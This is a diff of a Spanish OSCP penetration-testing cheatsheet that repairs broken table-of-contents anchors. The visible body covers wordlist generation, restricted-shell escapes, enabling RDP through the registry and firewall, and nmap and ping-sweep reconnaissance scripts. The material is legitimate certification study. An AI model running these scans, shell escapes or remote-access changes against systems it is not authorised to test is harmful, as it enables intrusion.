@@ -1,244 +1,238 @@
 ![alt=OSCP](./img/oscp-banner.png)
 
 # OSCP (Offensive Security Certified Professional) CheetSheet
-<a id="markdown-oscp-offensive-security-certified-professional-cheetsheet" name="oscp-offensive-security-certified-professional-cheetsheet"></a>
 Apuntes para la certificación OSCP.
 
 # Tabla de Contenido
-<a id="markdown-tabla-de-contenido" name="tabla-de-contenido"></a>
 
 <!-- TOC -->
 
 - [OSCP Offensive Security Certified Professional CheetSheet](#oscp-offensive-security-certified-professional-cheetsheet)
 - [Tabla de Contenido](#tabla-de-contenido)
-    - [<a nam](#a-nam)
-        - [<a](#a)
-            - [<a n](#a-n)
-            - [<a name='escapar-de-una-restr](#a-nameescapar-de-una-restr)
-            - [<a name='configuración-de-f](#a-nameconfiguraci%C3%B3n-de-f)
-        - [<a na](#a-na)
-            - [<a name='habi](#a-namehabi)
-            - [<a name='-ha](#a-name-ha)
-    - [<a n](#a-n)
-    - [<a name='informatio](#a-nameinformatio)
-        - [<a](#a)
-            - [<a name='identificaci](#a-nameidentificaci)
-        - [<](#)
-            - [<a name='descubrimiento-de-host-](#a-namedescubrimiento-de-host-)
-            - [<a name='escaneo](#a-nameescaneo)
-            - [<a name='versión](#a-nameversi%C3%B3n)
-            - [<a name='ud](#a-nameud)
-            - [<a name='u](#a-nameu)
-            - [<a name='obtener-ayuda-so](#a-nameobtener-ayuda-so)
-            - [<a name='listar-scri](#a-namelistar-scri)
-        - [<a name='escaneo](#a-nameescaneo)
-            - [<a name='descubrimiento-de-ho](#a-namedescubrimiento-de-ho)
-            - [<a name='descubrimiento-de-](#a-namedescubrimiento-de-)
-            - [<a name='descubrimiento-de-hosts-linux-a](#a-namedescubrimiento-de-hosts-linux-a)
-            - [<a name='descubrimiento-de-puertos-abi](#a-namedescubrimiento-de-puertos-abi)
-        - [<a name='escaneo-de-puertos-a-través-de-proxychains-u](#a-nameescaneo-de-puertos-a-trav%C3%A9s-de-proxychains-u)
-    - [<a name='servic](#a-nameservic)
-        - [<a nam](#a-nam)
-            - [<](#)
-            - [<a name='conexión-al-s](#a-nameconexi%C3%B3n-al-s)
-            - [<a name='interactuar-con-el-](#a-nameinteractuar-con-el-)
-            - [<a na](#a-na)
-            - [<a name='fuerza-bruta-de-c](#a-namefuerza-bruta-de-c)
-            - [<a name='archivos-de-co](#a-namearchivos-de-co)
-            - [<a name='descarg](#a-namedescarg)
-        - [<a name](#a-name)
-            - [<](#)
-            - [<a name](#a-name)
-            - [<a n](#a-n)
-            - [<a name=](#a-name)
-            - [<a na](#a-na)
-            - [<a name](#a-name)
-            - [<a name='rid-cyc](#a-namerid-cyc)
-            - [<a name='smb-de](#a-namesmb-de)
-            - [<a name='interactuar-con-el-](#a-nameinteractuar-con-el-)
-            - [<a name='montar-una-recurso](#a-namemontar-una-recurso)
-            - [<a name='fuerza-bruta-de-c](#a-namefuerza-bruta-de-c)
-        - [<a name='m](#a-namem)
-            - [<](#)
-            - [<a name='f](#a-namef)
-            - [<a name='coman](#a-namecoman)
-        - [<a name='m](#a-namem)
-            - [<](#)
-            - [<a na](#a-na)
-            - [<a nam](#a-nam)
-            - [<a name='coman](#a-namecoman)
-            - [<a name='mostrar-el-contenido-de-una-ba](#a-namemostrar-el-contenido-de-una-ba)
-            - [<a name='ejecució](#a-nameejecuci%C3%B3)
-        - [<a name='postgr](#a-namepostgr)
-            - [<a name='coman](#a-namecoman)
-            - [<a name='ejecución-remot](#a-nameejecuci%C3%B3n-remot)
-        - [<a name='snmp-](#a-namesnmp-)
-        - [<a name=](#a-name)
-            - [<a nam](#a-nam)
-            - [<a na](#a-na)
-    - [<](#)
-        - [<a name='enum](#a-nameenum)
-            - [<](#)
-            - [<a nam](#a-nam)
-            - [<a](#a)
-            - [<a nam](#a-nam)
-        - [<a name='enumera](#a-nameenumera)
-            - [<a name](#a-name)
-            - [<a n](#a-n)
-            - [<a n](#a-n)
-            - [<a na](#a-na)
-        - [<a name='local-file-incl](#a-namelocal-file-incl)
+    - [Comandos](#comandos)
+        - [Linux](#linux)
+            - [Crunch](#crunch)
+            - [Escapar de una Restricted Shell](#escapar-de-una-restricted-shell)
+            - [Configuración de Fecha y Hora](#configuraci%C3%B3n-de-fecha-y-hora)
+        - [Windows](#windows)
+            - [Habilitar WinRM](#habilitar-winrm)
+            - [Habilitar RDP](#habilitar-rdp)
+    - [Docker](#docker)
+    - [Information Gathering](#information-gathering)
+        - [Fping](#fping)
+            - [Identificación de hosts](#identificaci%C3%B3n-de-hosts)
+        - [Nmap](#nmap)
+            - [Descubrimiento de host - Ping Scan](#descubrimiento-de-host---ping-scan)
+            - [Escaneo de puertos](#escaneo-de-puertos)
+            - [Versión y Servicio](#versi%C3%B3n-y-servicio)
+            - [UDP top 100](#udp-top-100)
+            - [UDP top 20](#udp-top-20)
+            - [Obtener ayuda sobre scripts](#obtener-ayuda-sobre-scripts)
+            - [Listar scripts de Nmap](#listar-scripts-de-nmap)
+        - [Escaneo de puertos](#escaneo-de-puertos)
+            - [Descubrimiento de hosts Windows](#descubrimiento-de-hosts-windows)
+            - [Descubrimiento de hosts Linux](#descubrimiento-de-hosts-linux)
+            - [Descubrimiento de hosts Linux alternativa](#descubrimiento-de-hosts-linux-alternativa)
+            - [Descubrimiento de puertos abiertos Linux](#descubrimiento-de-puertos-abiertos-linux)
+        - [Escaneo de puertos a través de proxychains usando hilos](#escaneo-de-puertos-a-trav%C3%A9s-de-proxychains-usando-hilos)
+    - [Servicios Comunes](#servicios-comunes)
+        - [FTP 21](#ftp-21)
+            - [Nmap](#nmap)
+            - [Conexión al servidor FTP](#conexi%C3%B3n-al-servidor-ftp)
+            - [Interactuar con el cliente FTP](#interactuar-con-el-cliente-ftp)
+            - [Netexec](#netexec)
+            - [Fuerza bruta de credenciales](#fuerza-bruta-de-credenciales)
+            - [Archivos de configuración](#archivos-de-configuraci%C3%B3n)
+            - [Descargar archivos](#descargar-archivos)
+        - [SMB 445](#smb-445)
+            - [Nmap](#nmap)
+            - [smbclient](#smbclient)
+            - [smbmap](#smbmap)
+            - [enum4linux](#enum4linux)
+            - [Netexec](#netexec)
+            - [Rpcclient](#rpcclient)
+            - [RID Cycling Attack](#rid-cycling-attack)
+            - [SMB desde Windows](#smb-desde-windows)
+            - [Interactuar con el cliente SMB](#interactuar-con-el-cliente-smb)
+            - [Montar una recurso compartido](#montar-una-recurso-compartido)
+            - [Fuerza bruta de credenciales](#fuerza-bruta-de-credenciales)
+        - [MYSQL 3306](#mysql-3306)
+            - [Nmap](#nmap)
+            - [Fuerza bruta](#fuerza-bruta)
+            - [Comandos básicos](#comandos-b%C3%A1sicos)
+        - [MSSQL 1433](#mssql-1433)
+            - [Nmap](#nmap)
+            - [Netexec](#netexec)
+            - [Conexión](#conexi%C3%B3n)
+            - [Comandos básicos](#comandos-b%C3%A1sicos)
+            - [Mostrar el contenido de una base de datos](#mostrar-el-contenido-de-una-base-de-datos)
+            - [Ejecución de código](#ejecuci%C3%B3n-de-c%C3%B3digo)
+        - [PostgreSQL 5432](#postgresql-5432)
+            - [Comandos Comunes](#comandos-comunes)
+            - [Ejecución Remota de Código](#ejecuci%C3%B3n-remota-de-c%C3%B3digo)
+        - [SNMP 161 - UDP](#snmp-161---udp)
+        - [RDP 3389](#rdp-3389)
+            - [xfreerdp](#xfreerdp)
+            - [Netexec](#netexec)
+    - [Web](#web)
+        - [Enumeración Web](#enumeraci%C3%B3n-web)
+            - [Fuff](#fuff)
+            - [Gobuster](#gobuster)
+            - [Wfuzz](#wfuzz)
+            - [GitTools](#gittools)
+        - [Enumeración de CMS](#enumeraci%C3%B3n-de-cms)
+            - [Wordpress](#wordpress)
+            - [Joomla](#joomla)
+            - [Drupal](#drupal)
+            - [Magento](#magento)
+        - [Local File Inclusion LFI](#local-file-inclusion-lfi)
             - [Hasta php 5.3](#hasta-php-53)
             - [php://filter Wrapper](#phpfilter-wrapper)
             - [Archivos Linux](#archivos-linux)
             - [Archivos Windows](#archivos-windows)
-        - [<a name='sq](#a-namesq)
-            - [<a](#a)
-            - [<a](#a)
-            - [<a name=](#a-name)
-            - [<a name='error-based-sql-injec](#a-nameerror-based-sql-injec)
-            - [<a name='union-based-sql-injec](#a-nameunion-based-sql-injec)
-            - [<a name='sql-trunca](#a-namesql-trunca)
-        - [<a name='cross-site-scri](#a-namecross-site-scri)
-            - [<a name='petición-vía](#a-namepetici%C3%B3n-v%C3%ADa)
-            - [<a name='petición-vía-](#a-namepetici%C3%B3n-v%C3%ADa-)
-            - [<a name='compr](#a-namecompr)
-        - [<a name='xml-external-e](#a-namexml-external-e)
-        - [<a name='server-side-request-for](#a-nameserver-side-request-for)
-        - [<a name='server-side-template-injec](#a-nameserver-side-template-injec)
-            - [<a name='ma](#a-namema)
-            - [<a name='jinja-2---re](#a-namejinja-2---re)
-    - [<a nam](#a-nam)
-        - [<a n](#a-n)
-            - [<a name='servidor](#a-nameservidor)
-            - [<a name='client](#a-nameclient)
-            - [<a](#a)
-        - [<a name](#a-name)
-            - [<a name='descargar-el-proxy-](#a-namedescargar-el-proxy-)
-            - [<a name='preparar-las-interfaces-pa](#a-namepreparar-las-interfaces-pa)
-            - [<a name='configurar-pr](#a-nameconfigurar-pr)
-            - [<a name='configurar-el-agente-en-la-máqu](#a-nameconfigurar-el-agente-en-la-m%C3%A1qu)
-            - [<a name='configura](#a-nameconfigura)
-        - [<a name='ss](#a-namess)
-            - [<a name='local-port](#a-namelocal-port)
-            - [<a name='dynamic-port](#a-namedynamic-port)
-            - [<a name='remote-port](#a-nameremote-port)
-            - [<a name='remote-dynamic-port](#a-nameremote-dynamic-port)
-        - [<a nam](#a-nam)
-        - [<a na](#a-na)
-        - [<a](#a)
-        - [<a](#a)
-    - [<a name='passwo](#a-namepasswo)
-        - [<a n](#a-n)
-        - [<a name='group-policy-prefer](#a-namegroup-policy-prefer)
-            - [<a name='](#a-name)
-        - [<a na](#a-na)
-            - [<a name='reglas-per](#a-namereglas-per)
-        - [<a](#a)
-        - [<](#)
-        - [<a na](#a-na)
-        - [<a nam](#a-nam)
-        - [<a nam](#a-nam)
-    - [<a name='transferencia-](#a-nametransferencia-)
-        - [<a na](#a-na)
-            - [<a name='operaciones-](#a-nameoperaciones-)
-            - [<](#)
-            - [<](#)
-            - [<a name='operacione](#a-nameoperacione)
-        - [<a](#a)
-            - [<a name='operaciones-](#a-nameoperaciones-)
-            - [<a name='ataques-sin-archivos-u](#a-nameataques-sin-archivos-u)
-            - [<a name='descargar-con-bash](#a-namedescargar-con-bash)
-            - [<a name='de](#a-namede)
-            - [<a name=](#a-name)
-            - [<a n](#a-n)
-            - [<a name='método-alternativo-de-transferencia-de-a](#a-namem%C3%A9todo-alternativo-de-transferencia-de-a)
-            - [<a name='operacione](#a-nameoperacione)
-    - [<a name='movimie](#a-namemovimie)
-        - [<](#)
-            - [<a nam](#a-nam)
-        - [<](#)
-            - [<a n](#a-n)
-            - [<a name='sh](#a-namesh)
-            - [<a na](#a-na)
-            - [<a name](#a-name)
-            - [<a name=](#a-name)
-            - [<a name](#a-name)
-        - [<a](#a)
-            - [<a name='inv](#a-nameinv)
-            - [<a](#a)
-            - [<a name='ente](#a-nameente)
-            - [<a na](#a-na)
-            - [<a name=](#a-name)
-    - [<a name='escalación-de-](#a-nameescalaci%C3%B3n-de-)
-        - [<a na](#a-na)
-            - [<a name='](#a-name)
-            - [<a name='escalación-de-](#a-nameescalaci%C3%B3n-de-)
-        - [<a](#a)
-            - [<a name='](#a-name)
-            - [<a name='escalación-de-](#a-nameescalaci%C3%B3n-de-)
-        - [<a name='técnicas-de-explotación-de-tr](#a-namet%C3%A9cnicas-de-explotaci%C3%B3n-de-tr)
-    - [<a name='activ](#a-nameactiv)
-        - [<a name='powershell-para-gestionar-activ](#a-namepowershell-para-gestionar-activ)
-            - [<a name='importar-módulo-de-activ](#a-nameimportar-m%C3%B3dulo-de-activ)
-            - [<a na](#a-na)
-            - [<a nam](#a-nam)
-            - [<a n](#a-n)
-            - [<a name='trusts-](#a-nametrusts-)
-            - [<a name='c](#a-namec)
-            - [<a name='unidades-or](#a-nameunidades-or)
-            - [<a name='gpo-group-pol](#a-namegpo-group-pol)
-        - [<a name='habilitar-dont-r](#a-namehabilitar-dont-r)
-        - [<a name='deshabilitar-dont-r](#a-namedeshabilitar-dont-r)
-        - [<a name='](#a-name)
-            - [<a nam](#a-nam)
-            - [<a name='passwo](#a-namepasswo)
-            - [<a name=](#a-name)
-            - [<a name=](#a-name)
-            - [<a name='lda](#a-namelda)
-            - [<a name='net](#a-namenet)
-        - [<a name='grupos-pr](#a-namegrupos-pr)
-            - [<a name='accoun](#a-nameaccoun)
-            - [<a name='serve](#a-nameserve)
-            - [<a name](#a-name)
-            - [<a name='backu](#a-namebacku)
-        - [<a nam](#a-nam)
-            - [<a name='¿qué-e](#a-name%C2%BFqu%C3%A9-e)
-            - [<a name='as-](#a-nameas-)
-            - [<a name='ke](#a-nameke)
-        - [<a name='movimie](#a-namemovimie)
-        - [<a name='post-](#a-namepost-)
-    - [<a nam](#a-nam)
-        - [<a name='🛡️-permisos-delegables-en-activ](#a-name-permisos-delegables-en-activ)
-        - [<a name='🎯-flags-de-useraccountc](#a-name-flags-de-useraccountc)
-    - [<a name='herramientas](#a-nameherramientas)
-        - [<a nam](#a-nam)
-        - [<a name='informatio](#a-nameinformatio)
-        - [<](#)
-        - [<a name='bas](#a-namebas)
-        - [<a name='passwo](#a-namepasswo)
-        - [<a name](#a-name)
-        - [<a name='activ](#a-nameactiv)
-        - [<a name='escalación-de-](#a-nameescalaci%C3%B3n-de-)
-        - [<a name='recur](#a-namerecur)
+        - [SQL Injection](#sql-injection)
+            - [MySQL](#mysql)
+            - [MSSQL](#mssql)
+            - [Oracle SQL](#oracle-sql)
+            - [Error-based SQL Injection SQLi](#error-based-sql-injection-sqli)
+            - [UNION-based SQL Injection SQLi](#union-based-sql-injection-sqli)
+            - [SQL Truncation Attack](#sql-truncation-attack)
+        - [Cross-Site Scripting XSS](#cross-site-scripting-xss)
+            - [Petición vía Ajax - GET](#petici%C3%B3n-v%C3%ADa-ajax---get)
+            - [Petición vía Ajax - POST](#petici%C3%B3n-v%C3%ADa-ajax---post)
+            - [Comprimir script](#comprimir-script)
+        - [XML External Entity XXE](#xml-external-entity-xxe)
+        - [Server-Side Request Forgery SSRF](#server-side-request-forgery-ssrf)
+        - [Server-Side Template Injection SSTI](#server-side-template-injection-ssti)
+            - [Magic Payload](#magic-payload)
+            - [Jinja 2 - Reverse Shell](#jinja-2---reverse-shell)
+    - [Pivoting](#pivoting)
+        - [Chisel](#chisel)
+            - [Servidor Atacante](#servidor-atacante)
+            - [Cliente Víctima](#cliente-v%C3%ADctima)
+            - [Socat](#socat)
+        - [Ligolo-ng](#ligolo-ng)
+            - [Descargar el Proxy y el Agente](#descargar-el-proxy-y-el-agente)
+            - [Preparar las interfaces para el tunel](#preparar-las-interfaces-para-el-tunel)
+            - [Configurar proxy en Kali](#configurar-proxy-en-kali)
+            - [Configurar el agente en la máquina víctima](#configurar-el-agente-en-la-m%C3%A1quina-v%C3%ADctima)
+            - [Configurar la sesión](#configurar-la-sesi%C3%B3n)
+        - [SSH Tunneling](#ssh-tunneling)
+            - [Local Port Forwarding](#local-port-forwarding)
+            - [Dynamic Port Forwarding](#dynamic-port-forwarding)
+            - [Remote Port Forwarding](#remote-port-forwarding)
+            - [Remote Dynamic Port Forwarding](#remote-dynamic-port-forwarding)
+        - [sshuttle](#sshuttle)
+        - [ssh.exe](#sshexe)
+        - [Plink](#plink)
+        - [Netsh](#netsh)
+    - [Passwords Attacks](#passwords-attacks)
+        - [fcrack](#fcrack)
+        - [Group Policy Preferences GPP](#group-policy-preferences-gpp)
+            - [gpp-decrypt](#gpp-decrypt)
+        - [Hashcat](#hashcat)
+            - [Reglas personalizadas](#reglas-personalizadas)
+        - [Hydra](#hydra)
+        - [John](#john)
+        - [LaZagne](#lazagne)
+        - [Mimikatz](#mimikatz)
+        - [pypykatz](#pypykatz)
+    - [Transferencia de Archivos](#transferencia-de-archivos)
+        - [Windows](#windows)
+            - [Operaciones de Descarga](#operaciones-de-descarga)
+            - [SMB](#smb)
+            - [FTP](#ftp)
+            - [Operaciones de Subida](#operaciones-de-subida)
+        - [Linux](#linux)
+            - [Operaciones de Descarga](#operaciones-de-descarga)
+            - [Ataques sin archivos usando Linux](#ataques-sin-archivos-usando-linux)
+            - [Descargar con Bash /dev/tcp](#descargar-con-bash-devtcp)
+            - [Descargas SSH](#descargas-ssh)
+            - [Web Upload](#web-upload)
+            - [Netcat](#netcat)
+            - [Método alternativo de transferencia de archivos web](#m%C3%A9todo-alternativo-de-transferencia-de-archivos-web)
+            - [Operaciones de Subida](#operaciones-de-subida)
+    - [Movimiento Lateral](#movimiento-lateral)
+        - [RDP](#rdp)
+            - [xfreerdp](#xfreerdp)
+        - [SMB](#smb)
+            - [PsExec](#psexec)
+            - [SharpNoPSExec](#sharpnopsexec)
+            - [NimExec](#nimexec)
+            - [psexec.py](#psexecpy)
+            - [smbexec.py](#smbexecpy)
+            - [atexec.py](#atexecpy)
+        - [WinRM](#winrm)
+            - [Invoke-Command](#invoke-command)
+            - [WINRS](#winrs)
+            - [Enter-PSSession](#enter-pssession)
+            - [NetExec](#netexec)
+            - [Evil-WinRM](#evil-winrm)
+    - [Escalación de Privilegios](#escalaci%C3%B3n-de-privilegios)
+        - [Windows](#windows)
+            - [Enumeración](#enumeraci%C3%B3n)
+            - [Escalación de Privilegios](#escalaci%C3%B3n-de-privilegios)
+        - [Linux](#linux)
+            - [Enumeración](#enumeraci%C3%B3n)
+            - [Escalación de Privilegios](#escalaci%C3%B3n-de-privilegios)
+        - [Técnicas de explotación de trabajos Cron](#t%C3%A9cnicas-de-explotaci%C3%B3n-de-trabajos-cron)
+    - [Active Directory](#active-directory)
+        - [PowerShell para gestionar Active Directory](#powershell-para-gestionar-active-directory)
+            - [Importar módulo de Active Directory](#importar-m%C3%B3dulo-de-active-directory)
+            - [Sistema](#sistema)
+            - [Usuarios](#usuarios)
+            - [Grupos](#grupos)
+            - [Trusts Confianzas](#trusts-confianzas)
+            - [Computadoras](#computadoras)
+            - [Unidades Organizativas](#unidades-organizativas)
+            - [GPO Group Policy Object](#gpo-group-policy-object)
+        - [Habilitar DONT-REQ-PRE-AUTH](#habilitar-dont-req-pre-auth)
+        - [Deshabilitar DONT-REQ-PRE-AUTH](#deshabilitar-dont-req-pre-auth)
+        - [Enumeración](#enumeraci%C3%B3n)
+            - [Kerbrute](#kerbrute)
+            - [Password Spraying](#password-spraying)
+            - [BloodHound](#bloodhound)
+            - [ldapsearch](#ldapsearch)
+            - [ldapdomaindump](#ldapdomaindump)
+            - [NetExec - LDAP](#netexec---ldap)
+        - [Grupos Privilegiados](#grupos-privilegiados)
+            - [Account Operators](#account-operators)
+            - [Server Operators](#server-operators)
+            - [DnsAdmins](#dnsadmins)
+            - [Backup Operators](#backup-operators)
+        - [Kerberos](#kerberos)
+            - [¿Qué es Kerberos?](#%C2%BFqu%C3%A9-es-kerberos)
+            - [AS-REPRoasting](#as-reproasting)
+            - [Kerberoasting](#kerberoasting)
+        - [Movimiento Lateral](#movimiento-lateral)
+        - [Post Explotación](#post-explotaci%C3%B3n)
+    - [Apéndice](#ap%C3%A9ndice)
+        - [🛡️ Permisos delegables en Active Directory](#-permisos-delegables-en-active-directory)
+        - [🎯 Flags de userAccountControl AD](#-flags-de-useraccountcontrol-ad)
+    - [Herramientas y Recursos](#herramientas-y-recursos)
+        - [Pivoting](#pivoting)
+        - [Information Gathering](#information-gathering)
+        - [Web](#web)
+        - [Bases de datos](#bases-de-datos)
+        - [Passwords Attacks](#passwords-attacks)
+        - [Wordlists](#wordlists)
+        - [Active Directory](#active-directory)
+        - [Escalación de Privilegios](#escalaci%C3%B3n-de-privilegios)
+        - [Recursos y Blogs](#recursos-y-blogs)
 
 <!-- /TOC -->
 
-##  1. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+##  1. <a name='comandos'></a>Comandos
 
-###  1.1. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+###  1.1. <a name='linux'></a>Linux
 
-####  1.1.1. <a 
-<a id="markdown-%3Ca-n" name="%3Ca-n"></a>n
+####  1.1.1. <a name='crunch'></a>Crunch
 
 ```bash
 crunch 6 6 -t Lab%%% > wordlist
 ```
 
-####  1.1.2. <a name='escapar-de-una-rest
-<a id="markdown-%3Ca-name%3D'escapar-de-una-restr" name="%3Ca-name%3D'escapar-de-una-restr"></a>r
+####  1.1.2. <a name='escapar-de-una-restricted-shell'></a>Escapar de una Restricted Shell
 
 ```bash
 ssh user@10.0.0.3 -t "/bin/sh"
@@ -273,8 +267,7 @@ exec "/bin/sh"
 os.execute('/bin/sh')
 ```
 
-####  1.1.3. <a name='configuración-de-
-<a id="markdown-%3Ca-name%3D'configuraci%C3%B3n-de-f" name="%3Ca-name%3D'configuraci%C3%B3n-de-f"></a>f
+####  1.1.3. <a name='configuración-de-fecha-y-hora'></a>Configuración de Fecha y Hora
 
 ```bash
 sudo net time -c <RHOST>
@@ -291,26 +284,22 @@ sudo timedatectl set-time '2015-11-20 16:14:50'
 sudo timedatectl set-local-rtc 1
 ```
 
-###  1.2. <a n
-<a id="markdown-%3Ca-na" name="%3Ca-na"></a>a
+###  1.2. <a name='windows'></a>Windows
 
-####  1.2.1. <a name='hab
-<a id="markdown-%3Ca-name%3D'habi" name="%3Ca-name%3D'habi"></a>i
+####  1.2.1. <a name='habilitar-winrm'></a>Habilitar WinRM
 
 ```powershell
 winrm quickconfig
 ```
 
-####  1.2.2. <a name='-h
-<a id="markdown-%3Ca-name%3D'-ha" name="%3Ca-name%3D'-ha"></a>a
+####  1.2.2. <a name='-habilitar-rdp'></a> Habilitar RDP
 
 ```powershell
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 netsh advfirewall firewall set rule group="remote desktop" new enable=yes
 ```
 
-##  2. <a 
-<a id="markdown-%3Ca-n" name="%3Ca-n"></a>n
+##  2. <a name='docker'></a>Docker
 
 ```bash
 docker run                  # Corre un commando dentro de un contenedor a partir de una imágen
@@ -329,14 +318,11 @@ docker build                # Construye una imágen a partir de un Dockerfile
 docker network              # Permite crear una red
 ```
 
-##  3. <a name='informati
-<a id="markdown-%3Ca-name%3D'informatio" name="%3Ca-name%3D'informatio"></a>o
+##  3. <a name='information-gathering'></a>Information Gathering
 
-###  3.1. <
-<a id="markdown-%3Ca" name="%3Ca"></a>a 
+###  3.1. <a name='fping'></a>Fping
 
-####  3.1.1. <a name='identificac
-<a id="markdown-%3Ca-name%3D'identificaci" name="%3Ca-name%3D'identificaci"></a>i
+####  3.1.1. <a name='identificación-de-hosts'></a>Identificación de hosts
 
 ```bash
 fping -asgq 172.16.0.1/24
@@ -354,10 +340,9 @@ Parámetros utilizados:
 
 Con el escaneo realizado anteriormente con fping podemos armar una lista de hosts activos.
 
-###  3.2. <
+###  3.2. <a name='nmap'></a>Nmap
 
-####  3.2.1. <a name='descubrimiento-de-host
-<a id="markdown-%3Ca-name%3D'descubrimiento-de-host-" name="%3Ca-name%3D'descubrimiento-de-host-"></a>-
+####  3.2.1. <a name='descubrimiento-de-host---ping-scan'></a>Descubrimiento de host - Ping Scan
 
 ```bash
 sudo nmap -sn <TARGET-RANGE>
@@ -368,8 +353,7 @@ sudo nmap -sn 192.168.56.1/24
 
 - `-sn` Esta opción le dice a Nmap que no haga un escaneo de puertos después del descubrimiento de hosts y que sólo imprima los hosts disponibles que respondieron a la traza icmp.
 
-####  3.2.2. <a name='escane
-<a id="markdown-%3Ca-name%3D'escaneo" name="%3Ca-name%3D'escaneo"></a>o
+####  3.2.2. <a name='escaneo-de-puertos'></a>Escaneo de puertos
 
 ```bash
 sudo nmap -p- --open -Pn -n <RHOST> -oG openPorts -vvv
@@ -386,8 +370,7 @@ Parámetros utilizados:
 - `-oG`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es un formato _grepeable_, el cual almacena todo en una sola línea. De esta forma, es más sencillo procesar y obtener los puertos abiertos por medio de expresiones regulares, en conjunto con otras utilidades como pueden ser grep, awk, sed, entre otras.
 - `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.
 
-####  3.2.3. <a name='versió
-<a id="markdown-%3Ca-name%3D'versi%C3%B3n" name="%3Ca-name%3D'versi%C3%B3n"></a>n
+####  3.2.3. <a name='versión-y-servicio'></a>Versión y Servicio
 
 ```bash
 sudo nmap -sCV -p<PORTS> <RHOST> -oN servicesScan -vvv 
@@ -398,46 +381,39 @@ sudo nmap -sCV -p<PORTS> <RHOST> -oN servicesScan -vvv
 - `-oN`: Determina el formato del archivo en el cual se guardan los resultados obtenidos. En este caso, es el formato por defecto de nmap.
 - `-vvv`: Activa el modo _verbose_ para que nos muestre resultados a medida que los encuentra.
 
-####  3.2.4. <a name='u
-<a id="markdown-%3Ca-name%3D'ud" name="%3Ca-name%3D'ud"></a>d
+####  3.2.4. <a name='udp-(top-100)'></a>UDP (top 100)
 
 ```bash
 sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast <RHOST>
 ```
 
-####  3.2.5. <a name='
-<a id="markdown-%3Ca-name%3D'u" name="%3Ca-name%3D'u"></a>u
+####  3.2.5. <a name='udp-(top-20)'></a>UDP (top 20)
 
 ```bash
 sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 <RHOST>
 ```
 
-####  3.2.6. <a name='obtener-ayuda-s
-<a id="markdown-%3Ca-name%3D'obtener-ayuda-so" name="%3Ca-name%3D'obtener-ayuda-so"></a>o
+####  3.2.6. <a name='obtener-ayuda-sobre-scripts'></a>Obtener ayuda sobre scripts
 
 ```bash
 nmap --script-help="http-*"
 ```
 
-####  3.2.7. <a name='listar-scr
-<a id="markdown-%3Ca-name%3D'listar-scri" name="%3Ca-name%3D'listar-scri"></a>i
+####  3.2.7. <a name='listar-scripts-de-nmap'></a>Listar scripts de Nmap
 
 ```bash
 locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
 ```
-###  3.3. <a name='escane
-<a id="markdown-%3Ca-name%3D'escaneo" name="%3Ca-name%3D'escaneo"></a>o
+###  3.3. <a name='escaneo-de-puertos-1'></a>Escaneo de puertos
 
-####  3.3.1. <a name='descubrimiento-de-h
-<a id="markdown-%3Ca-name%3D'descubrimiento-de-ho" name="%3Ca-name%3D'descubrimiento-de-ho"></a>o
+####  3.3.1. <a name='descubrimiento-de-hosts-windows'></a>Descubrimiento de hosts Windows
 
 ```powershell
 arp -d
 for /L %a (1,1,254) do @start /b ping 40.40.40.%a -w 100 -n 2 >nul
 arp -a
 ```
-####  3.3.2. <a name='descubrimiento-de
-<a id="markdown-%3Ca-name%3D'descubrimiento-de-" name="%3Ca-name%3D'descubrimiento-de-"></a>-
+####  3.3.2. <a name='descubrimiento-de-hosts-linux'></a>Descubrimiento de hosts Linux
 
 ```bash
 for i in $(seq 1 254); do ping -c 1 192.168.50.$i &>/dev/null && echo "[+] Host 192.168.50.$i - ACTIVE"; done
@@ -456,8 +432,7 @@ done; wait
 ```bash
 ./hostDiscovery.sh 192.168.56
 ```
-####  3.3.3. <a name='descubrimiento-de-hosts-linux-(
-<a id="markdown-%3Ca-name%3D'descubrimiento-de-hosts-linux-a" name="%3Ca-name%3D'descubrimiento-de-hosts-linux-a"></a>a
+####  3.3.3. <a name='descubrimiento-de-hosts-linux-(alternativa)'></a>Descubrimiento de hosts Linux (alternativa)
 
 Si la máquina no cuenta con la utilidad `ping`, podemos utilizar el siguiente script como alternativa:
 
@@ -475,8 +450,7 @@ wait
 ```bash
 ./hostDiscovery.sh 192.168.56
 ```
-####  3.3.4. <a name='descubrimiento-de-puertos-ab
-<a id="markdown-%3Ca-name%3D'descubrimiento-de-puertos-abi" name="%3Ca-name%3D'descubrimiento-de-puertos-abi"></a>i
+####  3.3.4. <a name='descubrimiento-de-puertos-abiertos-linux'></a>Descubrimiento de puertos abiertos Linux
 
 ```bash
 #!/bin/bash
@@ -489,8 +463,7 @@ done; wait
 ```bash
 ./portDiscovery.sh <RHOST>
 ```
-###  3.4. <a name='escaneo-de-puertos-a-través-de-proxychains-
-<a id="markdown-%3Ca-name%3D'escaneo-de-puertos-a-trav%C3%A9s-de-proxychains-u" name="%3Ca-name%3D'escaneo-de-puertos-a-trav%C3%A9s-de-proxychains-u"></a>u
+###  3.4. <a name='escaneo-de-puertos-a-través-de-proxychains-usando-hilos'></a>Escaneo de puertos a través de proxychains usando hilos
 
 ```bash
 seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -p{} -open -T5 -Pn -n <RHOST> -vvv -oN servicesScan 2>&1 | grep "tcp open"
@@ -502,16 +475,14 @@ echo $TOP_500 | tr ',' '\n' | xargs -P 500 -I {} proxychains nmap -sT -p{} --ope
 echo $TOP_1000 | tr ',' '\n' | xargs -P 500 -I {} proxychains nmap -sT -p{} --open -T5 -Pn -n <RHOST> 2>&/dev/null | grep "tcp open" | tee open_ports.txt
 ```
 
-##  4. <a name='servi
-<a id="markdown-%3Ca-name%3D'servic" name="%3Ca-name%3D'servic"></a>c
+##  4. <a name='servicios-comunes'></a>Servicios Comunes
 
-###  4.1. <a na
-<a id="markdown-%3Ca-nam" name="%3Ca-nam"></a>m
+###  4.1. <a name='ftp-(21)'></a>FTP (21)
 
